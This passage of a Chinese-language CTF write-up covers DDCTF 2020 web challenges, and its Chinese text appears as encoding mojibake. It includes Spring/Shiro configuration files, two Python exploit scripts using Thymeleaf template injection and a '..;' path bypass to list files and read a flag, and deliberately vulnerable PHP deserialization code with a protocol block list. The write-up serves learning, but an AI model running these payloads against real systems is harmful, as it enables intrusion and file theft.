class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>safeFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.ctf.util.SafeFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>safeFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>shiroFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.DelegatingFilterProxy<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>targetFilterLifecycle<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>shiroFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>500<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">location</span>&gt;</span>/error.jsp<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>404<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">location</span>&gt;</span>/hacker.jsp<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>403<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">location</span>&gt;</span>/hacker.jsp<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>WEB-INF/classes/spring-web.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:mvc</span>=<span class="string">"http://www.springframework.org/schema/mvc"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- è‡ªåŠ¨æ‰«æ Controller åŒ… --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.ctf.controller"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.ctf.repository"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.ctf.service"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- æ³¨è§£é…ç½®å’Œä¹±ç å¤„ç† --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mvc:message-converters</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.http.converter.StringHttpMessageConverter"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">"UTF-8"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mvc:message-converters</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:default-servlet-handler</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>WEB-INF/classes/spring-core.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">"http://www.springframework.org/schema/p"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:aop</span>=<span class="string">"http://www.springframework.org/schema/aop"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:jee</span>=<span class="string">"http://www.springframework.org/schema/jee"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:tx</span>=<span class="string">"http://www.springframework.org/schema/tx"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.0.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.0.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/jee http://www.springframework.org/schema/jee/spring-jee-4.0.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">"classpath:spring-shiro.xml"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- å£°æ˜è‡ªåŠ¨ä¸ºspringå®¹å™¨ä¸­é‚£äº›é…ç½®@Aspectjåˆ‡é¢çš„beanåˆ›å»ºä»£ç†ï¼Œç»‡å…¥åˆ‡é¢ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:aspectj-autoproxy</span>&gt;</span><span class="tag">&lt;/<span class="name">aop:aspectj-autoproxy</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- æ”¯æŒäº‹ç‰©æ³¨è§£ï¼ˆ@Transactionalï¼‰ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tx:annotation-driven</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"viewResolver"</span> <span class="attr">class</span>=<span class="string">"org.thymeleaf.spring4.view.ThymeleafViewResolver"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"order"</span> <span class="attr">value</span>=<span class="string">"1"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"characterEncoding"</span> <span class="attr">value</span>=<span class="string">"UTF-8"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"templateEngine"</span> <span class="attr">ref</span>=<span class="string">"templateEngine"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"templateEngine"</span> <span class="attr">class</span>=<span class="string">"org.thymeleaf.spring4.SpringTemplateEngine"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"templateResolver"</span> <span class="attr">ref</span>=<span class="string">"templateResolver"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"templateResolver"</span> <span class="attr">class</span>=<span class="string">"org.thymeleaf.spring4.templateresolver.SpringResourceTemplateResolver"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefix"</span> <span class="attr">value</span>=<span class="string">"/WEB-INF/templates/"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suffix"</span> <span class="attr">value</span>=<span class="string">".html"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"templateMode"</span> <span class="attr">value</span>=<span class="string">"HTML5"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"cacheable"</span> <span class="attr">value</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"characterEncoding"</span>  <span class="attr">value</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:annotation-config</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.ctf"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">"annotation"</span> <span class="attr">expression</span>=<span class="string">"org.springframework.stereotype.Service"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">"annotation"</span> <span class="attr">expression</span>=<span class="string">"org.springframework.stereotype.Repository"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>WEB-INF/classes/com/ctf/util/SafeFilter.class</p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907150313875.png" alt="image-20200907150313875"></p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907150429584.png" alt="image-20200907150429584"></p>
<p>WEB-INF/classes/com/ctf/controller/IndexController.class</p>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907194322445.png" alt="image-20200907194322445"></p>
<p>WEB-INF/classes/com/ctf/controller/AuthController.class</p>
<img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907194510559.png" alt="image-20200907194510559" style="zoom:150%;">

<p>WEB-INF/classes/com/ctf/auth/ShiroRealm.class</p>
<img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907194341223.png" alt="image-20200907194341223" style="zoom:150%;">

<p>å‚è€ƒl3yxçš„wpè„šæœ¬ï¼Œè€ƒç‚¹æ˜¯thymeleafæ¨¡æ¿æ³¨å…¥ã€‚</p>
<blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"Host"</span>: <span class="string">"116.85.37.131"</span>,</span><br><span class="line">    <span class="string">"Cache-Control"</span>: <span class="string">"max-age=0"</span>,</span><br><span class="line">    <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>,</span><br><span class="line">    <span class="string">"Origin"</span>: <span class="string">"http://116.85.37.131"</span>,</span><br><span class="line">    <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"</span>,</span><br><span class="line">    <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span>,</span><br><span class="line">    <span class="string">"Referer"</span>: <span class="string">"http://116.85.37.131/34867ccfda85234382210155be32525c/;/web/68759c96217a32d5b368ad2965f625ef/index"</span>,</span><br><span class="line">    <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line">    <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.9"</span>,</span><br><span class="line">    <span class="string">"Connection"</span>: <span class="string">"close"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">render</span><span class="params">(payload)</span>:</span></span><br><span class="line">    print(<span class="string">"[+] submit..."</span>)</span><br><span class="line">    url = <span class="string">"http://116.85.37.131/34867ccfda85234382210155be32525c/;/web/68759c96217a32d5b368ad2965f625ef/customize"</span></span><br><span class="line">    data = <span class="string">"content="</span>+urllib.parse.quote_plus(payload)</span><br><span class="line"></span><br><span class="line">    res = requests.post(url = url,headers = headers,data = data)</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">"Success! Please fetch .(.*)? !"</span>,res.text) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        print(res.text)</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> re.search(<span class="string">"Success! Please fetch .(.*)? !"</span>,res.text).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getResult</span><span class="params">(url)</span>:</span></span><br><span class="line">    print(<span class="string">"[+] getResult..."</span>)</span><br><span class="line">    url = <span class="string">"http://116.85.37.131/34867ccfda85234382210155be32525c/;/web/68759c96217a32d5b368ad2965f625ef"</span>+url</span><br><span class="line"></span><br><span class="line">    res = requests.get(url,headers=headers)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getString</span><span class="params">(string)</span>:</span></span><br><span class="line">    strc=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        strc = strc + <span class="string">"T(com.ctf.model.User).getName()[3].replace(46,&#123;&#125;)+"</span>.format(str(ord(i)))</span><br><span class="line">    <span class="keyword">return</span> strc[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getClass</span><span class="params">(className)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"T(com.ctf.model.User).getClassLoader().loadClass("</span>+getString(className)+<span class="string">")"</span></span><br><span class="line"></span><br><span class="line">poc = <span class="string">"$&#123;"</span>+getClass(<span class="string">"java.util.Arrays"</span>)+<span class="string">".toString("</span>+    getClass(<span class="string">"java.nio.file.Files"</span>)+<span class="string">".list("</span>+getClass(<span class="string">"java.nio.file.Paths"</span>)+<span class="string">".get("</span>+getString(<span class="string">"/"</span>)+<span class="string">")).toArray()"</span>     +<span class="string">")&#125;"</span></span><br><span class="line">poc = <span class="string">"&lt;input th:value="</span>+poc+<span class="string">"&gt;"</span></span><br><span class="line">print(getResult(render(poc)))</span><br><span class="line"></span><br><span class="line">poc = <span class="string">"$&#123;"</span>+getClass(<span class="string">"java.util.Arrays"</span>)+<span class="string">".toString("</span>+    getClass(<span class="string">"java.nio.file.Files"</span>)+<span class="string">".lines("</span>+getClass(<span class="string">"java.nio.file.Paths"</span>)+<span class="string">".get("</span>+getString(<span class="string">"/flag_is_here"</span>)+<span class="string">")).toArray()"</span>     +<span class="string">")&#125;"</span></span><br><span class="line">poc = <span class="string">"&lt;input th:value="</span>+poc+<span class="string">"&gt;"</span></span><br><span class="line">print(getResult(render(poc)))</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/09/07/2020DDCTFweb%E9%A2%98%E7%9B%AE/image-20200907151746252.png" alt="image-20200907151746252"></p>
<blockquote>
<p>å‚è€ƒ<a href="https://wulidecade.cn/2020/09/06/2020DDCTF-wp/#more" target="_blank" rel="noopener">decade</a>çš„è§£æ³•ï¼Œæ˜¯åˆ©ç”¨1.class.forname()è·å–ç±»ï¼Œç”¨Stringç±»åŠ¨æ€ç”Ÿæˆå­—ç¬¦ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(message)</span>:</span></span><br><span class="line">    payload = <span class="string">'T(Character).toString(%s)'</span> % ord(message[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> message[<span class="number">1</span>:]:</span><br><span class="line">        payload +=<span class="string">'.concat(T(Character).toString(%s))'</span> % ord(ch)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://116.85.37.131/34867ccfda85234382210155be32525c/xxx/..;/web/68759c96217a32d5b368ad2965f625ef/customize"</span></span><br><span class="line">pattern = re.compile(<span class="string">"render\/(.*?) !"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># GetFlagName</span></span><br><span class="line">message =<span class="string">'1.class. forName(&#123;Files&#125;).list(1.class. forName(&#123;Paths&#125;).get(&#123;path&#125;)).toArray()[19]'</span>.format(Files=encode(<span class="string">"java.nio.file.Files"</span>), Paths=encode(<span class="string">"java.nio.file.Paths"</span>), path=encode(<span class="string">"/"</span>))</span><br><span class="line">res1 = requests.post(url,data = &#123;<span class="string">"content"</span>:<span class="string">"[[$&#123;"</span>+message+<span class="string">"&#125;]]"</span>&#125;)</span><br><span class="line">render = pattern.search(res1.text)</span><br><span class="line">renderurl = requests.get(<span class="string">"http://116.85.37.131/34867ccfda85234382210155be32525c/xxx/..;/web/68759c96217a32d5b368ad2965f625ef/render/&#123;&#125;"</span>.format(render.group(<span class="number">1</span>)))</span><br><span class="line"><span class="comment"># print(renderurl.text)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># GetFlag</span></span><br><span class="line">message = <span class="string">'1.class. forName(&#123;Files&#125;).lines(1.class. forName(&#123;Paths&#125;).get(&#123;path&#125;)).toArray()[0]'</span>.format(Files=encode(<span class="string">"java.nio.file.Files"</span>), Paths=encode(<span class="string">"java.nio.file.Paths"</span>), path=encode(<span class="string">"/flag_is_here"</span>))</span><br><span class="line">res2 = requests.post(url,data = &#123;<span class="string">"content"</span>:<span class="string">"[[$&#123;"</span>+message+<span class="string">"&#125;]]"</span>&#125;)</span><br><span class="line">render = pattern.search(res2.text)</span><br><span class="line">renderurl = requests.get(<span class="string">"http://116.85.37.131/34867ccfda85234382210155be32525c/xxx/..;/web/68759c96217a32d5b368ad2965f625ef/render/&#123;&#125;"</span>.format(render.group(<span class="number">1</span>)))</span><br><span class="line">print(renderurl.text)</span><br></pre></td></tr></table></figure>
</blockquote>
<h1 id="0x04-overwrite-me"><a href="#0x04-overwrite-me" class="headerlink" title="0x04 overwrite me"></a>0x04 overwrite me</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $kw0ng;</span><br><span class="line">    <span class="keyword">var</span> $flag;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;kw0ng = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> system(<span class="string">'find /FlagNeverFall '</span> . escapeshellcmd(<span class="keyword">$this</span>-&gt;flag));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Prompter</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span>  $hint;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|zlib|zip|bzip2|data|glob|phar|ssh2|rar|ogg|expect|\.\.|\.\//i"</span>, <span class="keyword">$this</span>-&gt;hint))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Don't Do That!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;execute(<span class="keyword">$this</span>-&gt;hint);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Display</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $contents;</span><br><span class="line">    <span class="keyword">public</span> $page;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'/hint/hint.php'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;contents = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Welcome to DDCTF 2020, Have fun!&lt;br/&gt;&lt;br/&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;contents();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;page-&gt;contents = <span class="string">"POP me! I can give you some hints!"</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;page-&gt;cont);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Repeater</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $cont;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $func = <span class="keyword">$this</span>-&gt;content;</span><br><span class="line">        var_dump($func);</span><br><span class="line">        <span class="keyword">return</span> $func();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$show = <span class="keyword">new</span> Display();</span><br><span class="line">$bullet = $_GET[<span class="string">'bullet'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($bullet))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Give Me Something!"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($bullet == <span class="string">'phpinfo'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $infos = <span class="keyword">new</span> Info();</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $obstacle = <span class="keyword">new</span> stdClass;</span><br><span class="line">    $mc = <span class="keyword">new</span> MyClass();</span><br><span class="line">    $mc-&gt;flag = <span class="string">"MyClass's flag said, Overwrite Me If You Can!"</span>;</span><br><span class="line">    @unserialize($bullet);</span><br><span class="line">    <span class="keyword">echo</span> $show-&gt;contents;</span><br><span class="line">    <span class="keyword">echo</span> $mc-&gt;get_flag();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹phpinfo()å¯¹åº”çš„phpç‰ˆæœ¬ä¸ºphp5.6.10ï¼Œæ­£å¥½è€ƒå¯Ÿçš„æ˜¯å‰æœŸçš„<a href="https://paper.seebug.org/1267/" target="_blank" rel="noopener">https://paper.seebug.org/1267/</a>ï¼ŒGMPçš„æ¼æ´ã€‚</p>
<p>è®¿é—®hint.phpï¼Œå¾—åˆ°å‰åŠæ®µflagã€‚</p>
